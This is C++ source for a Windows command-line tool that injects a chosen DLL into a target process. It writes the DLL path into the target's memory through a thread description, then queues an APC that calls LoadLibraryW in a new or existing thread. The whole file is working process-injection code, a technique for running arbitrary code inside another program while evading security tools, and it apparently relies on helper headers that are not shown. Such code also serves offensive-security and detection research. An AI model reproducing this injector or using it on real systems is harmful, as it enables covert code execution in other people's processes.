#include <windows.h>

#include <iostream>
#include <sstream>

#include "../common.h"
#include "../ntdll_wrappers.h"
//---

int loadInt(const std::wstring& str, bool as_hex)
{
	int intVal = 0;

	std::wstringstream ss;
	ss << (as_hex ? std::hex : std::dec) << str;
	ss >> intVal;

	return intVal;
}

bool inject_with_loadlibrary(HANDLE hProcess, PVOID remote_ptr)
{
#ifdef USE_NEW_THREADS
	HANDLE hThread = create_alertable_thread(hProcess);
#else
	HANDLE hThread = find_thread(hProcess, SYNCHRONIZE | THREAD_SET_CONTEXT);
#endif
	bool isOk = queue_apc_thread(hThread, LoadLibraryW, remote_ptr, 0, 0);
#ifndef USE_NEW_THREADS
	ResumeThread(hThread);
#endif
	CloseHandle(hThread);
	return isOk;
}

int wmain(int argc, wchar_t* argv[])
{
	std::cout << "Dll Injection with ThreadName\n";

	DWORD processID = 0;
	
	if (argc < 3) {
		std::cout << "Arg <dll_path> <PID>\n";
		return 0;
	}

	std::wstring dllName = argv[1];

	processID = loadInt(argv[2], false);
	std::cout << "Supplied PID: " << processID << "\n";

	if (!processID) {
		std::cerr << "Invalid process ID supplied...\n";
		return -1;
	}

#ifdef USE_NEW_THREADS
	std::cout << "[*] Injecting into NEW threads\n";
#else
	std::cout << "[*] Inject into existing threads\n";
#endif
#ifdef USE_OLD_APC_API
	std::cout << "[*] Using old API for APC\n";
#else
	std::cout << "[*] Using new API for APC\n";
#endif

	const wchar_t* buf = dllName.c_str();
	std::wcout << "Supplied DLL: " << buf << "\n";
	const size_t buf_size = wcslen(buf) * sizeof(WCHAR);
	HANDLE hProcess = open_process(processID);
	if (!hProcess) {
		std::cerr << "Opening process failed!\n";
		return -1;
	}

	const void* remotePtr = get_peb_unused(hProcess);
	if (!remotePtr) return -2;
	// write buffer via thread description
	void* wPtr = pass_via_thread_name(hProcess, (BYTE*)buf, buf_size, remotePtr);
	std::cout << "Received pointer:  " << std::hex << wPtr << "\n";

	if (inject_with_loadlibrary(hProcess, wPtr)) {
		std::cout << "Written!\n";
	}
	return 0;
}
